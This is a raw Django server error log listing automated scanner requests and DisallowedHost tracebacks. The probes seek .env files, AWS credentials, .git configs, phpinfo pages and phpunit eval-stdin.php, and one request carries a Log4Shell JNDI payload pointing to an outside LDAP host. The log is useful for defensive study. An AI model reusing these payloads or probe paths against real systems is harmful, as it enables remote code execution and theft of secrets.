Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /logon.htm
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /logon.htm
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /helpdesk/WebObjects/Helpdesk.woa
Not Found: /_profiler/phpinfo
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/index
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: /libs/js/iframe.js
Not Found: /wp-includes/js/jquery/jquery.js
Invalid HTTP_HOST header: 'softsec.science'. You may need to add 'softsec.science' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'softsec.science'. You may need to add 'softsec.science' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /core/config/.git/config
Not Found: /logs/current/.git/config
Not Found: /static../.git/config
Not Found: /test/.git/config
Not Found: /user_panel/.git/config
Not Found: /staging/.git/config
Not Found: /dev/.git/config
Not Found: /build_tool/.git/config
Not Found: /cms/.git/config
Not Found: /dev/backup/.git/config
Not Found: /media../.git/config
Not Found: /sandbox/.git/config
Not Found: /app/dev/.git/config
Not Found: /api/.git/config
Not Found: /actuator/health
Not Found: /robots.txt
Not Found: /portal/redlion
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /api/bin/123123
Not Found: /test/.git/config
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /robots.txt
Not Found: /.git/HEAD
Invalid HTTP_HOST header: '142.93.161.32'. You may need to add '142.93.161.32' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '142.93.161.32'. You may need to add '142.93.161.32' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /.env.ci
Not Found: /.env.stage
Not Found: /.env.uat
Not Found: /server/.git/config
Not Found: /config.json
Not Found: /.env.preprod
Not Found: /.env.backup
Not Found: /app/.git/config
Not Found: /.aws/credentials
Not Found: /.env.config
Not Found: /.env.test
Not Found: /.env.bak
Not Found: /.env.template
Not Found: /cms/.git/config
Not Found: /core/.git/config
Not Found: /public/.git/config
Not Found: /prod/.env
Not Found: /.env.development.local
Not Found: /.env.default
Not Found: /.env.dist
Not Found: /.env
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /wp-login.php
Not Found: /.env
Not Found: /api/.env
Not Found: /phpinfo.php
Not Found: /phpinfo
Not Found: /.env.save
Not Found: /.env.prod
Not Found: /login/.env
Not Found: /local/.env
Not Found: /dev/.env
Not Found: /application/.env
Not Found: /php_info.php
Not Found: /_profiler/phpinfo
Forbidden (CSRF cookie not set.): /
Not Found: /hello.world
Forbidden (CSRF cookie not set.): /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /actuator/gateway/routes
Not Found: /robots.txt
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.git/refs/
Not Found: /phpmyadmin/index.php
Not Found: /pmd/index.php
Not Found: /phpmyadmin4.8.5/index.php
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /libs/js/iframe.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /robots.txt
Not Found: /sitemap_index.xml
Not Found: /robots.txt
Not Found: /${jndi:ldap://81.181.248.148:1389/Exploit}
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/refs/heads/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: /auth.json
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /asdf.php
Not Found: /pinfo.php
Not Found: /phpversion.php
Not Found: /old_phpinfo.php
Not Found: /infos.php
Not Found: /php-info.php
Not Found: /dashboard/phpinfo.php
Not Found: /phpinfo.php3
Not Found: /phpinfo.php4
Not Found: /phpinfo.php5
Not Found: /_profiler/phpinfo.php
Not Found: /laravel/core/.env
Not Found: /beta/.env
Not Found: /kyc/.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /phpmyadmin/index.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /.aws/credentials
Not Found: /www/.git/config
Not Found: /.env.local
Not Found: /.env.preprod
Not Found: /.env.secret
Not Found: /files/.git/config
Not Found: /.env.bak
Not Found: /configuration/.env
Not Found: /server/.git/config
Not Found: /.env.ci
Not Found: /.env.dist
Not Found: /.env.prod
Not Found: /api/.env
Not Found: /src/.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/js/jquery/jquery.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /sdk
Bad Request: /
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /nmaplowercheck1739590941
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /HNAP1
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /evox/about
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /all/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /core/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
